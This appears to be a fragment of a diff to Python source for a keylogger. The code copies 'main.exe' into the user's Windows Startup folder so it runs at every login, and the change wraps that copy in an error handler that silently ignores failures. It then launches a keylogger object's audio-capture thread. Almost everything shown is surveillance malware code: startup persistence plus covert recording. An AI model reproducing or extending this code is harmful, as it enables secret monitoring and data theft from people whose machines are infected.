@@ -6,8 +6,11 @@ import shutil
 import os
 
 name = os.getlogin()
-target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)
-shutil.copy('main.exe', target)
+try:
+  target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)
+  shutil.copy('main.exe', target)
+except:
+  pass
 
 keyloggerobject = keylogger()
 t = threading.Thread(target=keyloggerobject.take_sound)
